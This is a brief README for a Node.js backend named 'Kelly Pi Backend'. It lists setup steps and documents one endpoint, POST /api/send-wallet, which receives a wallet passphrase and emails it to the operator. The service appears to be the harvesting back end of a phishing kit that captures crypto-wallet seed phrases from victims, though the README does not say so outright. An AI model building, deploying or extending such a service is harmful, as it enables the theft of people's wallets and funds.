# Kelly Pi Backend

## Setup

1. Copy `.env.example` to `.env` and fill in your email credentials.
2. Run `npm install` in the `backend` folder.
3. Start the server in development mode:

```
npm run dev
```

## API

### POST `/api/send-wallet`
Send a wallet passphrase to your email.

**Body:**
```
{
  "passphrase": "the passphrase string"
}
```

**Response:**
- 200: `{ message: 'Email sent successfully' }`
- 400: `{ error: 'Passphrase is required' }`
- 500: `{ error: 'Failed to send email', details: ... }`
